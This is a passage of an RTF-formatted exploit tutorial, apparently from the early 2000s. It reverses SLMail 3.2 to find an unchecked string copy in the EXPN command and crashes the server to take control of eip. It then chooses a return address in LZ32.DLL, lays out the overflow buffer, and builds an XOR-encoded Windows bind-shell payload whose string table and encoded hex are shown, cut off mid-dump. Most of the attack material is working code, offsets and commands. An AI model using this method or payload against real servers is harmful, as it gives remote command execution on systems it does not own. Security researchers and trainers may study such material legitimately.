\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 004048EC                 jnz     short loc_40495A
\par \hich\af1\dbch\af28\loch\f1 004048EE \hich\af1\dbch\af28\loch\f1                 mov     ecx, [esp+27Ch+arg_10]
\par \hich\af1\dbch\af28\loch\f1 004048F5                 mov     esi, [esp+27Ch+arg_C]
\par \hich\af1\dbch\af28\loch\f1 004048FC                 mov     eax, [ecx]
\par \hich\af1\dbch\af28\loch\f1 004048FE                 cmp     eax, 8
\par \hich\af1\dbch\af28\loch\f1 00404901                 jnz     short loc_404914
\par \hich\af1\dbch\af28\loch\f1 00404903            \hich\af1\dbch\af28\loch\f1      mov     ecx, [esi+100h]
\par \hich\af1\dbch\af28\loch\f1 00404909                 test    ecx, ecx
\par \hich\af1\dbch\af28\loch\f1 0040490B                 jz      short loc_404914
\par \hich\af1\dbch\af28\loch\f1 0040490D                 mov     ebx, 1
\par \hich\af1\dbch\af28\loch\f1 00404912                 jmp     short loc_404916
\par 
\par \hich\af1\dbch\af28\loch\f1 A comparison to 17h, again.. \hich\af1\dbch\af28\loch\f1 not us, so we continue to follow the jumps until we reach...
\par 
\par \hich\af1\dbch\af28\loch\f1 00404B7F loc_404B7F:                             ; CODE XREF: sub_404850+1C0_j
\par \hich\af1\dbch\af28\loch\f1 00404B7F                 cmp     ecx, 19h
\par \hich\af1\dbch\af28\loch\f1 00404B82                 jnz     loc_404D7F
\par \hich\af1\dbch\af28\loch\f1 00404B88                 mov \hich\af1\dbch\af28\loch\f1     eax, dword_457354
\par \hich\af1\dbch\af28\loch\f1 00404B8D                 test    eax, eax
\par \hich\af1\dbch\af28\loch\f1 00404B8F                 jz      loc_404D4F
\par \hich\af1\dbch\af28\loch\f1 00404B95                 mov     eax, dword_457384
\par \hich\af1\dbch\af28\loch\f1 00404B9A                 mov     edi, [esp+27Ch+our_input]
\par \hich\af1\dbch\af28\loch\f1 00404BA1                 push    0
\par \hich\af1\dbch\af28\loch\f1 004\hich\af1\dbch\af28\loch\f1 04BA3                 push    eax
\par \hich\af1\dbch\af28\loch\f1 00404BA4                 push    edi
\par \hich\af1\dbch\af28\loch\f1 00404BA5                 call    sub_4365A0
\par 
\par \hich\af1\dbch\af28\loch\f1 And here's our boy, note how our variables we renamed follow all through the call, IDA rocks doesn't it? :)
\par 
\par \hich\af1\dbch\af28\loch\f1 So edi gets our string input, a\hich\af1\dbch\af28\loch\f1 nd we follow yet another call - again we'll rename the useful stack variable upon entering the next call. i.e.: edi = arg_0 = our_input
\par 
\par \hich\af1\dbch\af28\loch\f1 004365A0 sub_4365A0      proc near               ; CODE XREF: sub_4029D0+92_p
\par \hich\af1\dbch\af28\loch\f1 004365A0                                 \hich\af1\dbch\af28\loch\f1         ; sub_4029D0+107_p ...
\par \hich\af1\dbch\af28\loch\f1 004365A0 
\par \hich\af1\dbch\af28\loch\f1 004365A0 var_12C         = byte ptr -12Ch
\par \hich\af1\dbch\af28\loch\f1 004365A0 var_12B         = byte ptr -12Bh
\par \hich\af1\dbch\af28\loch\f1 004365A0 our_input       = dword ptr  4
\par \hich\af1\dbch\af28\loch\f1 004365A0 arg_4           = dword ptr  8
\par \hich\af1\dbch\af28\loch\f1 004365A0 arg_8           = dword ptr  0Ch
\par \hich\af1\dbch\af28\loch\f1 004365A0 
\par \hich\af1\dbch\af28\loch\f1 004365A0                 mov     eax, [esp+arg_8]
\par \hich\af1\dbch\af28\loch\f1 004365A4                 mov     ecx, [esp+arg_4]
\par \hich\af1\dbch\af28\loch\f1 004365A8                 sub     esp, 12Ch
\par \hich\af1\dbch\af28\loch\f1 004365AE                 lea     edx, [esp+12Ch+var_12C]
\par \hich\af1\dbch\af28\loch\f1 004365B2                 push    0
\par \hich\af1\dbch\af28\loch\f1 004365B4            \hich\af1\dbch\af28\loch\f1      push    eax
\par \hich\af1\dbch\af28\loch\f1 004365B5                 mov     eax, [esp+134h+our_input]
\par \hich\af1\dbch\af28\loch\f1 004365BC                 push    ecx
\par \hich\af1\dbch\af28\loch\f1 004365BD                 push    12Ch
\par \hich\af1\dbch\af28\loch\f1 004365C2                 push    edx
\par \hich\af1\dbch\af28\loch\f1 004365C3                 push    eax
\par \hich\af1\dbch\af28\loch\f1 004365C4                 call  \hich\af1\dbch\af28\loch\f1   sub_4364A0
\par 
\par \hich\af1\dbch\af28\loch\f1 And yet another call, again take notice of the order in which the registers were pushed, eax=arg_0=our_input.  I have a feeling we are getting closer to the goods.
\par 
\par \hich\af1\dbch\af28\loch\f1 Ok, I admit it. I peeked.
\par 
\par \hich\af1\dbch\af28\loch\f1 004364A0 sub_4364A0      proc near               ;\hich\af1\dbch\af28\loch\f1  CODE XREF: sub_436470+1B_p
\par \hich\af1\dbch\af28\loch\f1 004364A0                                         ; sub_4365A0+24_p ...
\par \hich\af1\dbch\af28\loch\f1 004364A0 
\par \hich\af1\dbch\af28\loch\f1 004364A0 var_98          = byte ptr -98h
\par \hich\af1\dbch\af28\loch\f1 004364A0 var_8C          = byte ptr -8Ch
\par \hich\af1\dbch\af28\loch\f1 004364A0 var_78          = byte ptr -78h
\par \hich\af1\dbch\af28\loch\f1 004364A0 var_6C         \hich\af1\dbch\af28\loch\f1  = byte ptr -6Ch
\par \hich\af1\dbch\af28\loch\f1 004364A0 var_35          = byte ptr -35h
\par \hich\af1\dbch\af28\loch\f1 004364A0 var_15          = byte ptr -15h
\par \hich\af1\dbch\af28\loch\f1 004364A0 var_8           = dword ptr -8
\par \hich\af1\dbch\af28\loch\f1 004364A0 var_4           = dword ptr -4
\par \hich\af1\dbch\af28\loch\f1 004364A0 our_input       = dword ptr  4
\par \hich\af1\dbch\af28\loch\f1 004364A0 arg_4           =\hich\af1\dbch\af28\loch\f1  dword ptr  8
\par \hich\af1\dbch\af28\loch\f1 004364A0 
\par \hich\af1\dbch\af28\loch\f1 004364A0                 mov     eax, [esp+our_input]
\par \hich\af1\dbch\af28\loch\f1 004364A4                 sub     esp, 64h
\par \hich\af1\dbch\af28\loch\f1 004364A7                 push    ebx
\par \hich\af1\dbch\af28\loch\f1 004364A8                 push    ebp
\par \hich\af1\dbch\af28\loch\f1 004364A9                 push    esi
\par \hich\af1\dbch\af28\loch\f1 004364AA                 \hich\af1\dbch\af28\loch\f1 mov     esi, [esp+70h+arg_4]
\par \hich\af1\dbch\af28\loch\f1 004364AE                 push    edi
\par \hich\af1\dbch\af28\loch\f1 004364AF                 push    eax
\par \hich\af1\dbch\af28\loch\f1 004364B0                 push    esi
\par \hich\af1\dbch\af28\loch\f1 004364B1                 call    ds:lstrcpyA
\par \hich\af1\dbch\af28\loch\f1 004364B7                 push    40h
\par \hich\af1\dbch\af28\loch\f1 004364B9                 push    e\hich\af1\dbch\af28\loch\f1 si
\par \hich\af1\dbch\af28\loch\f1 004364BA                 call    j_lstrchr
\par \hich\af1\dbch\af28\loch\f1 004364BF                 test    eax, eax
\par \hich\af1\dbch\af28\loch\f1 004364C1                 jz      short loc_4364C6
\par \hich\af1\dbch\af28\loch\f1 004364C3                 mov     byte ptr [eax], 0
\par 
\par \hich\af1\dbch\af28\loch\f1 And here we have it, the classic screw-up.  esi points to the buff\hich\af1\dbch\af28\loch\f1 er, eax has our string - *bang* strcpy.
\par 
\par \hich\af1\dbch\af28\loch\f1 Did anyone out there notice any form of bounds checking up to this point? I sure didn't.
\par 
\par \hich\af1\dbch\af28\loch\f1 Please guys, do not try to hide from us - we CAN see what you do.
\par 
\par \hich\af1\dbch\af28\loch\f1 Now we know EXPN is our sure-fire victim.  Feel free to fo\hich\af1\dbch\af28\loch\f1 llow some of the other commands, you will run into similar coding practice, Seattle Labs have a lot to clean up.
\par 
\par \hich\af1\dbch\af28\loch\f1 From a relatively quick reversing session, we find a common mistake \hich\f1 \endash \loch\f1  yet a mistake that compromises the entire server.
\par 
\par \hich\af1\dbch\af28\loch\f1 
Now, obviously, a lot of sessions won't be as straight forward - wait for a rainy day, have an extra packet of cigarettes on hand, a bottle of vodka, crank some 30footFALL and get hacking - patience is a virtue, take your time and navigate the code, you'l
\hich\af1\dbch\af28\loch\f1 l\hich\af1\dbch\af28\loch\f1  be amazed at what you find.
\par 
\par \hich\af1\dbch\af28\loch\f1 And hey, even if you come up empty, by the time you've downed that bottle you won't care anyway.
\par 
\par \hich\af1\dbch\af28\loch\f1 With enough patience and determination, you will find a barrage of different holes and vulnerabilities through disassembly techn\hich\af1\dbch\af28\loch\f1 iques.  It is an asset worth having.
\par 
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Section 2: The Exploit.
\par \hich\af1\dbch\af28\loch\f1 ~~~~~~~~~~~~~~~~~~~~~~~
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 Although this section will cover some tricks, techniques and the process of exploiting overflows in Windows, the main purpose of this section is to document what I cons\hich\af1\dbch\af28\loch\f1 
ider the most ideal shellcode available for Win32 exploits at this time.
\par 
\par \hich\af1\dbch\af28\loch\f1 The last thing I want to do is go over already covered ground - none the less, I will document the route I took personally before creating the payload.  To those of you who have done\hich\af1\dbch\af28\loch\f1 
 this sort of thing before, feel free to skip straight to the shellcode.
\par 
\par \hich\af1\dbch\af28\loch\f1 Before we begin, I just have something to say quickly regarding some members of the security community.
\par 
\par \hich\af1\dbch\af28\loch\f1 When I released the IIS exploit (the definition of proof of concept :)), some\hich\af1\dbch\af28\loch\f1  of the mail was rather unsettling.
\par 
\par \hich\af1\dbch\af28\loch\f1 Mail from employees of large corporations and yes, government agencies, bearing titles such as 'Head of Network Security' and similar who were using the exploit to determine the risk to their servers.  If the exploit fa
\hich\af1\dbch\af28\loch\f1 iled, some were prepared to class the risk as minimal.
\par 
\par \hich\af1\dbch\af28\loch\f1 Do not determine the threat to your servers solely on the results of one public exploit - the vulnerability exists, fix it.  If you think that was the only demonstration code floating around you need 
\hich\af1\dbch\af28\loch\f1 your head examined.
\par 
\par \hich\af1\dbch\af28\loch\f1 Hopefully now, you may change your attitude.  The masses now have full control, without fail.
\par 
\par \hich\af1\dbch\af28\loch\f1 Here we go.
\par 
\par \hich\af1\dbch\af28\loch\f1 My experience with NT is rather limited, in fact, I've only recently made the move from spelunking Windows 9x.
\par 
\par \hich\af1\dbch\af28\loch\f1 Unfortunately what I've noticed under NT is SoftIce has a bit of trouble trapping faults, and other debuggers tend to break in after the exception handling has kicked in.
\par 
\par \hich\af1\dbch\af28\loch\f1 This sucks for a couple of reasons.
\par 
\par \hich\af1\dbch\af28\loch\f1 If an exception is raised after a string length\hich\af1\dbch\af28\loch\f1 
 routine tries to read from invalid memory for example, under NT its quite likely that it'll be the exception handler itself that overwrites eip with your data (IIS comes to mind again).
\par 
\par \hich\af1\dbch\af28\loch\f1 We can route our eip to an offset at that point if we wish, but it i\hich\af1\dbch\af28\loch\f1 
sn't particularly delicate, we'd be much better off to try and throw in some valid addresses and let the code ret to an eip with our data.
\par 
\par \hich\af1\dbch\af28\loch\f1 What I suggest is setting a breakpoint on the exception dispatcher and dumping the eip it was called from.. 
\par 
\par \hich\af1\dbch\af28\loch\f1 e.g.: \hich\af1\dbch\af28\loch\f1 bpx KiUserExceptionDispatcher DO "dd *esp+0c"
\par 
\par \hich\af1\dbch\af28\loch\f1 Now if eip hasn't been overwritten you can break at that offset and see what you have to play with, if eip has been taken then the offset at that  location should be your bytes.
\par 
\par \hich\af1\dbch\af28\loch\f1 In that case you can either tr\hich\af1\dbch\af28\loch\f1 y and trace back into the blown stack and find a location to break on relatively close to where we ret to our eip, or just take an educated guess.
\par 
\par \hich\af1\dbch\af28\loch\f1 The latter is the path we'll take.
\par 
\par \hich\af1\dbch\af28\loch\f1 Let's break this thing.
\par 
\par \hich\af1\dbch\af28\loch\f1 attica:~> telnet 192.168.10.3 8376
\par \hich\af1\dbch\af28\loch\f1 Trying 192.1\hich\af1\dbch\af28\loch\f1 68.10.3...
\par \hich\af1\dbch\af28\loch\f1 Connected to 192.168.10.3.
\par \hich\af1\dbch\af28\loch\f1 Escape character is '^]'.
\par \hich\af1\dbch\af28\loch\f1 220 supermax.gen.nz Smtp Server SLMail v3.2 Ready ESMTP spoken here
\par \hich\af1\dbch\af28\loch\f1 expn xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxx\hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par 
\par \hich\af1\dbch\af28\loch\f1 Our debugger breaks in, obviously in this case eip has been totally taken, look at where the handler was called - 0x78787878, i.e.: xxxx.
\par 
\par \hich\af1\dbch\af28\loch\f1 Ok, now we want to find the exact point in the code where we return to our addre\hich\af1\dbch\af28\loch\f1 ss - let's take a look at the disassembly.
\par 
\par \hich\af1\dbch\af28\loch\f1 004364AF                 push    eax
\par \hich\af1\dbch\af28\loch\f1 004364B0                 push    esi
\par \hich\af1\dbch\af28\loch\f1 004364B1                 call    ds:lstrcpyA
\par 
\par \hich\af1\dbch\af28\loch\f1 Let's set a breakpoint just above the call to lstrcpy, that way we can also have a closer lo\hich\af1\dbch\af28\loch\f1 ok at the buffer manipulation and we should be mere footsteps away from total system control.
\par 
\par \hich\af1\dbch\af28\loch\f1 Ok, send the data and let your debugger kick in, ret out of the call and you'll quickly reach..
\par 
\par \hich\af1\dbch\af28\loch\f1 or\tab eax, -01
\par \hich\af1\dbch\af28\loch\f1 add\tab esp, 0000012c
\par \hich\af1\dbch\af28\loch\f1 ret
\par 
\par \hich\af1\dbch\af28\loch\f1 That's where we wanna be, tha\hich\af1\dbch\af28\loch\f1 t ret will drop us to our eip.  We have control.
\par 
\par \hich\af1\dbch\af28\loch\f1 Now, to go somewhere useful.
\par 
\par \hich\af1\dbch\af28\loch\f1 Let's examine the registers and see what we have to play with, esp is totalled and points somewhere around the middle of our buffer.  So we could jump the stack, but why bother\hich\af1\dbch\af28\loch\f1 
?  Take a look at some of those other registers - edi has our buffer directly after the "expn".  We couldn't have asked for anything better.  Although there are a fair few different ways to jump the stack, we'll almost always find a "call edi" or similar.

\par 
\par \hich\af1\dbch\af28\loch\f1 Let's think about this for a moment, in a perfect world we'd just reference an offset in slmail.exe - but this is the world of Windows.
\par 
\par \hich\af1\dbch\af28\loch\f1 We have to avoid null bytes so unfortunately we can't use the exe itself, as \hich\af1\dbch\af28\loch\f1 
it is loaded at the default base address of 0x00400000.  We could use a location in the executable if we were to place our offset at the end of our data, as we'd have the null at the end of the string, but that doesn't leave us with enough space for a dec
\hich\af1\dbch\af28\loch\f1 e\hich\af1\dbch\af28\loch\f1 nt payload.  Remember we don't want this to be dependent on the version of NT at all, so we either need to use a DLL included with SLMail or an external DLL that is static on all service packs.

\par 
\par \hich\af1\dbch\af28\loch\f1 So let's take a look at what else has been loaded from that p\hich\af1\dbch\af28\loch\f1 rocess. SysInternals (http://www.sysinternals.com) have a handy little util called listdlls which will show you just that.
\par 
\par \hich\af1\dbch\af28\loch\f1 C:\\tools>listdlls slmail.exe
\par 
\par \hich\af1\dbch\af28\loch\f1 ListDLLs V2.1
\par \hich\af1\dbch\af28\loch\f1 Copyright (C) 1997-1999 Mark Russinovich
\par \hich\af1\dbch\af28\loch\f1 http://www.sysinternals.com
\par 
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 ------------------\hich\af1\dbch\af28\loch\f1 ------------------------------------------------------------
\par \hich\af1\dbch\af28\loch\f1 slmail.exe pid: 159
\par \hich\af1\dbch\af28\loch\f1   Base        Size      Version         Path
\par \hich\af1\dbch\af28\loch\f1   0x00400000  0x62000   3.02.0001.1204  E:\\PROGRA~1\\SLmail\\slmail.exe
\par \hich\af1\dbch\af28\loch\f1   0x77f60000  0x5c000   4.00.1381.0130  E:\\WINNT\\System32\\nt\hich\af1\dbch\af28\loch\f1 dll.dll
\par \hich\af1\dbch\af28\loch\f1   0x10000000  0xc000    2.03.0000.0000  E:\\WINNT\\system32\\OpenC32.dll
\par \hich\af1\dbch\af28\loch\f1   }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 0x77f00000  0x5e000   4.00.1381.0133  E:\\WINNT\\system32\\KERNEL32.dll
\par \hich\af1\dbch\af28\loch\f1   0x77ed0000  0x2c000   4.00.1381.0115  E:\\WINNT\\system32\\GDI32.dll
\par \hich\af1\dbch\af28\loch\f1   0x77e70000  0x54000   4.00.1381.0133 \hich\af1\dbch\af28\loch\f1  E:\\WINNT\\system32\\USER32.dll
\par \hich\af1\dbch\af28\loch\f1   0x77dc0000  0x3f000   4.00.1381.0121  E:\\WINNT\\system32\\ADVAPI32.dll
\par \hich\af1\dbch\af28\loch\f1   0x77e10000  0x57000   4.00.1381.0131  E:\\WINNT\\system32\\RPCRT4.dll
\par \hich\af1\dbch\af28\loch\f1   0x77d80000  0x32000   4.00.1381.0027  E:\\WINNT\\system32\\comdlg32.dll
\par \hich\af1\dbch\af28\loch\f1   0x77c40000  0\hich\af1\dbch\af28\loch\f1 x13c000  4.00.1381.0114  E:\\WINNT\\system32\\SHELL32.dll
\par \hich\af1\dbch\af28\loch\f1   0x77aa0000  0x74000   4.72.3609.2200  E:\\WINNT\\system32\\COMCTL32.dll
\par \hich\af1\dbch\af28\loch\f1   0x776d0000  0x8000    4.00.1381.0131  E:\\WINNT\\system32\\WSOCK32.dll
\par \hich\af1\dbch\af28\loch\f1   0x776b0000  0x14000   4.00.1381.0133  E:\\WINNT\\system32\\WS\hich\af1\dbch\af28\loch\f1 2_32.dll
\par \hich\af1\dbch\af28\loch\f1   0x78000000  0x40000   6.00.8337.0000  E:\\WINNT\\system32\\MSVCRT.dll
\par \hich\af1\dbch\af28\loch\f1   0x776a0000  0x7000    4.00.1381.0031  E:\\WINNT\\system32\\WS2HELP.dll
\par \hich\af1\dbch\af28\loch\f1   0x77a90000  0xb000    4.00.1371.0001  E:\\WINNT\\system32\\VERSION.dll
\par \hich\af1\dbch\af28\loch\f1   \hich\af1\dbch\af28\loch\f1 0x779c0000  0x8000    4.00.1371.0001  E:\\WINNT\\system32\\LZ32.dll
\par \hich\af1\dbch\af28\loch\f1   0x77bf0000  0x7000    4.00.1381.0072  E:\\WINNT\\system32\\rpcltc1.dll
\par \hich\af1\dbch\af28\loch\f1   0x77660000  0xf000    4.00.1381.0037  E:\\WINNT\\system32\\msafd.dll
\par \hich\af1\dbch\af28\loch\f1   0x77690000  0x9000    4.00.1381.0037  E:\\WINNT\\Syst\hich\af1\dbch\af28\loch\f1 em32\\wshtcpip.dll
\par \hich\af1\dbch\af28\loch\f1   0x74ff0000  0xd000    4.00.1381.0131  E:\\WINNT\\System32\\rnr20.dll
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 
There's not much loaded there in the way of its own DLL's, so we'll have to pick something external.  LZ32.DLL will do, static on all service packs, has the code we need\hich\af1\dbch\af28\loch\f1  and the offset has no null bytes.
\par \hich\af1\dbch\af28\loch\f1  
\par \hich\af1\dbch\af28\loch\f1 We find at location 0x779C1CAA we have a "call edi", that'll do nicely.
\par 
\par \hich\af1\dbch\af28\loch\f1 The next problem - we need to know where in our buffer to stuff our offset. A quick and easy way to find this out is to fill your buffer with a he\hich\af1\dbch\af28\loch\f1 
ap of independent bytes, 1A, 2A, 3A, 4A....A1, A2 and so on, and you'll be able to pinpoint the location when eip is overwritten.
\par 
\par \hich\af1\dbch\af28\loch\f1 Quickly we notice that the location we need is about 300 bytes into our buffer, so we have:
\par 
\par \hich\af1\dbch\af28\loch\f1 expn <299 nops> 0x779c1caa
\par 
\par \hich\af1\dbch\af28\loch\f1 So i\hich\af1\dbch\af28\loch\f1 
n its current form, if we were to send that data, eip would return to the offset 0x779c1caa which would call edi and execute our nops - before the offset we will also add in a short jump to bypass the garbage instructions that our offset was translated to
\hich\af1\dbch\af28\loch\f1 .
\par 
\par \hich\af1\dbch\af28\loch\f1 Now all that remains is to tack our payload on to the end.
\par 
\par \hich\af1\dbch\af28\loch\f1 It's time. 
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 The Payload.
\par \hich\af1\dbch\af28\loch\f1 ~~~~~~~~~~~~
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 Note: the ideas for the string table/jump table came from DilDog, very cool. Amazing work you do.
\par 
\par \hich\af1\dbch\af28\loch\f1 The goal:
\par 
\par \hich\af1\dbch\af28\loch\f1 An exploit that spawns a command prompt directly on a specified port, and will execute successfully on all NT versions. 
\par 
\par \hich\af1\dbch\af28\loch\f1 Considerations:
\par 
\par \hich\af1\dbch\af28\loch\f1 - We are unsure of the exact OS version.
\par \hich\af1\dbch\af28\loch\f1 - Function locations will differ depending on versions/service packs/upgrade\hich\af1\dbch\af28\loch\f1 s.
\par \hich\af1\dbch\af28\loch\f1 - The import table for SLMail does not have all needed functions.
\par \hich\af1\dbch\af28\loch\f1 - We must avoid null bytes, carriage returns etc.
\par 
\par \hich\af1\dbch\af28\loch\f1 We can take care of the first three problems by linking to the IAT of slmail, and using those procedures to load external functions.  As\hich\af1\dbch\af28\loch\f1  for the fourth? We'll just have to be clever.
\par 
\par \hich\af1\dbch\af28\loch\f1 In order for me to keep the shellcode as generic as possible, we will create a jump table of all external functions we will be using, without relying on SLMails imports - with two exceptions.
\par 
\par \hich\af1\dbch\af28\loch\f1 For us to be ab\hich\af1\dbch\af28\loch\f1 le to load DLL's and retrieve the addresses for needed procedures we will need to reference two functions from the import table of slmail.exe:
\par 
\par \hich\af1\dbch\af28\loch\f1 GetProcAddress and LoadLibraryA.
\par 
\par \hich\af1\dbch\af28\loch\f1 Before I show the table we create, I want to give a brief rundown on what's in\hich\af1\dbch\af28\loch\f1 
volved when spawning a remote shell under Windows NT.  Unfortunately it is not anywhere near as straight forward as when you're working with *nix, but, of course, it's do-able.  To be able to spawn a full-blown remote shell, we need to be able to redirect
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 standard output and standard error to the connected user, and the connected user must have control over standard input.
\par 
\par \hich\af1\dbch\af28\loch\f1 The answer?
\par 
\par \hich\af1\dbch\af28\loch\f1 Anonymous Pipes.
\par 
\par \hich\af1\dbch\af28\loch\f1 The primary use for anonymous pipes is to exchange data between parent/child processes, or just between \hich\af1\dbch\af28\loch\f1 child processes.
\par 
\par \hich\af1\dbch\af28\loch\f1 
The anonymous pipe is a one-way pipe - the data will flow in one direction - from one end, to the other.  The usefulness is apparent when we are working with the console, as we can replace the handles of stdin/stdout/stderr with handles t
\hich\af1\dbch\af28\loch\f1 
o the ends of the created pipes.  We can then read and write to the pipes with the Read and Writefile API's.  From the read end of the stdout pipe, we send the buffer to the connected socket and subsequently what we receive from the connected socket we fi
\hich\af1\dbch\af28\loch\f1 r\hich\af1\dbch\af28\loch\f1 e off to the write end of the stdin pipe.
\par 
\par \hich\af1\dbch\af28\loch\f1 To keep it generic our string table is unfortunately going to have to include a fair few functions, all taking up precious bytes.  When you are strapped \hich\af1\dbch\af28\loch\f1 
for stack space you'll want to make use of more functions from your targets IAT.
\par 
\par \hich\af1\dbch\af28\loch\f1 The table:
\par 
\par \hich\af1\dbch\af28\loch\f1         db "KERNEL32",0\tab ;string to push for LoadLibrary.
\par \tab \hich\af1\dbch\af28\loch\f1 db "CreatePipe",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "GetStartupInfoA",0  
\par 
\par \hich\af1\dbch\af28\loch\f1 ;we will modify the start-up structure at runtime as the st\hich\af1\dbch\af28\loch\f1 ructure is far
\par \hich\af1\dbch\af28\loch\f1 ;too large to include in the shellcode.
\par \tab 
\par \tab \hich\af1\dbch\af28\loch\f1 db "CreateProcessA",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "PeekNamedPipe",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "GlobalAlloc",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "WriteFile",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "ReadFile",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "Sleep",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "ExitProcess",0
\par \tab 
\par \tab \hich\af1\dbch\af28\loch\f1 db "WSOCK32",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "socket",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "bind",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "listen",0
\par \tab \hich\af1\dbch\af28\loch\f1 db \hich\af1\dbch\af28\loch\f1 "accept",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "send",0
\par \tab \hich\af1\dbch\af28\loch\f1 db "recv",0
\par 
\par \hich\af1\dbch\af28\loch\f1 sockstruc STRUCT
\par \tab \hich\af1\dbch\af28\loch\f1 sin_family dw 0002h
\par \tab }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 sin_port   dw ?
\par \tab }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 sin_addr   dd ?
\par \tab }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 sin_zero   db 8 dup (0)
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 sockstruc ENDS
\par 
\par \hich\af1\dbch\af28\loch\f1 ;the sin_port word value will be filled by the exploit client before the
\par \hich\af1\dbch\af28\loch\f1 ;shellcode is sent.\tab 
\par \tab 
\par \tab \hich\af1\dbch\af28\loch\f1 db "cmd.exe",0
\par \tab \hich\af1\dbch\af28\loch\f1 dd 0ffffffffh
\par \tab \hich\af1\dbch\af28\loch\f1 db 00dh, 00ah
\par 
\par \hich\af1\dbch\af28\loch\f1 ;the string to push to invoke the command prompt. 
\par \hich\af1\dbch\af28\loch\f1 ;the dword at the end will be used to reference the end of the string table 
\par \hich\af1\dbch\af28\loch\f1 ;at runtime.
\par 
\par \hich\af1\dbch\af28\loch\f1 Now, I know what you're thinking - all those strings are null-termi\hich\af1\dbch\af28\loch\f1 nated,\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
and the structures contain null bytes.  To get around this, we will XOR\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 the string table with 0x99, except for the carriage, linefeed, and the\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
0xFFFFFFFF dword.
\par 
\par \hich\af1\dbch\af28\loch\f1 If all went to plan, your encrypted table should look a little something\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 like this:
\par 
\par \hich\af1\dbch\af28\loch\f1 0\hich\af1\dbch\af28\loch\f1 0000280  .. .. .. .. .. .. .. .. .. .. .. D2 DC CB D7 DC              .....
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 00000290  D5 AA AB 99 DA EB FC F8-ED FC C9 F0 E9 FC 99 DE   ................
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 000002A0  FC ED CA ED F8 EB ED EC-E9 D0 F7 FF F6 D8 99 DA   ................
\par \hich\af1\dbch\af28\loch\f1 000002B0  EB FC F8 ED FC C9 EB F6-FA FC EA EA D8 99 DA F5   ................
\par \hich\af1\dbch\af28\loch\f1 000002C0  F6 EA FC D1 F8 F7 FD F5-FC 99 C9 FC FC F2 D7 F8   ................
\par \hich\af1\dbch\af28\loch\f1 000002D0  F4 FC FD C9 F0 E9 FC 99-DE F5 F6 FB F8 F5 D8 F5   ................
\par \hich\af1\dbch\af28\loch\f1 000002E0  F5 F6 FA 99 CE \hich\af1\dbch\af28\loch\f1 EB F0 ED-FC DF F0 F5 FC 99 CB FC   ................
